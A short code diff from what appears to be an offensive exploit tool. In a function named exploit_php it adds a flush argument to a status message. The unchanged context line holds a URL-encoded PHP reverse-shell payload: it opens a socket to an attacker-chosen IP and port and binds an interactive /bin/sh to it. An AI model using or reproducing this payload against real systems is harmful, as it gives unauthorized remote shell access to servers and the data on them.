@@ -17,7 +17,8 @@ def exploit_php(exploit, method, ip, port):
     phpPayload = f'php+-r+\'$sock%3dfsockopen("{ip}",{port})%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b\''
 
     print(
-        colors.purple("[?]") + " Checking if php is available on the target system..."
+        colors.purple("[?]") + " Checking if php is available on the target system...",
+        flush = True
     )
 
     if method == "INPUT":
